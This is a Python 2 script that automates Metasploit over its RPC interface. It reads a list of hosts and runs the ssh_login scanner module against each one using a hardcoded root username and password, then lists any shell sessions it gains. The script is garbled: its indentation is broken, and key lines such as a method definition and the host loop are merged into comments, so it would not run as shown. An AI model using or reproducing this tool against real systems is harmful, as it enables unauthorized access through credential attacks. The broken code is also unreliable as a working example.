#!/usr/bin/python 
import msgpack, urllib2, time # 
# User parameters # 
HOSTS_FILE = "ssh_hosts.txt" 
USERNAME    = "root" 
PASSWORD    = "s3cr3t" 
class MsfRpcCore: 
# Initialize common variables, perform MSF login, and create a console 
    def __init__(self, host='127.0.0.1', port=55552, user='msf', password='pa55w0rd'): 
		self.host = host 
		self.port = port 
		self.user = user 
		self.password = password 
		self.auth_token = self.login() 
		self.console_id = self.create_console() 
# Used to generate a template of an MSF RPC request def get_vanilla_request(self): 
		base_url = "http://" + self.host + ":" + str(self.port) + "/api/" 
		base_request = urllib2.Request(base_url) 
		base_request.add_header('Content-type', 'binary/message-pack') 
	    	return base_request 
# Perform a login to MSF, return the auth_token needed for subsequent requests 
    def login(self): 
		options = ['auth.login', self.user, self.password] 
		response = self.run(params=options, auth=False, console=False) 
		token = None 
		if response.get('result') == 'success': 
			print "[+] Authentication successful" 
			token = response.get('token') 
		else: 
			print "[-] Authentication failed" 
			exit() 
	        return token 
# Function to create an MSF console.Returns console ID needed for subsequent requests 
    def create_console(self): 
		options = ['console.create'] 
		response = self.run(params=options, console=False) 
		if response.get('id') is None: 
			print "[-] Unable to create console" 
			exit() 
			print "[+] Console %s created" % response.get('id') 
		return response.get('id') 
# Run an MSF command. Params list includes method name and MSF command 
# Auth is a boolean indicating if the method requires an auth token 
# Console is a boolean indicating if the method requires a console 
# Returns an unpacked response which is a dictionary of dictionaries 
    def run(self, params=[], auth=True, console=True): 
		if auth == True and not self.auth_token: 
	    		print "[-] You must first log in to MSF" 
	    	exit() 
		if console == True and not self.console_id: 
	    		print "[-] Console required for command" 
	    	return None 
		if auth: 
		    params.insert(1, self.auth_token) 
		if console: 
		    params.insert(2, self.console_id) 
		    request = self.get_vanilla_request() 
		    query_params = msgpack.packb(params) 
		    request.add_data(query_params) 
		    response = msgpack.unpackb(urllib2.urlopen(request).read()) 
		if params[0] == 'console.write': 
			time.sleep(1) 
			while True: 
				response = self.run(params=['console.read']) 
				if response['busy'] == True: 
					time.sleep(1) 
					continue 
				break 
		return response 
		if __name__ == '__main__': 
	# Read in file of host IPs 
			infile = open(HOSTS_FILE, 'r') 
			hosts = infile.readlines() 
			infile.close() 
	# Setup object, perform login, create console 
			msfrpc = MsfRpcCore() 
	# Loop through each host running SSH login against it for host in hosts: 
			cmd = """ use auxiliary/scanner/ssh/ssh_login set RHOSTS %s set USERNAME %s set PASSWORD %s set BLANK_PASSWORDS false 
	set USER_AS_PASS false exploit """ % (host, USERNAME, PASSWORD) 
			print "[!] Testing host %s" % host 
			response = msfrpc.run(params=['console.write', cmd]) 
# Retrieve sessions 
			response = msfrpc.run(params=['session.list'], console=False) 
		if len(response) > 0: print "[+] Listing sessions..." 
		print "%-15s%s" % ("Session ID", "Target") 
		for sess_id in response: 
			print "%-15s%s@%s" % (sess_id, response[sess_id].get('username'), response[sess_id].get('target_host')) 
		else: 
			print "[-] No sessions found" 
# Cleanup 
		msfrpc.run(params=['console.destroy'])
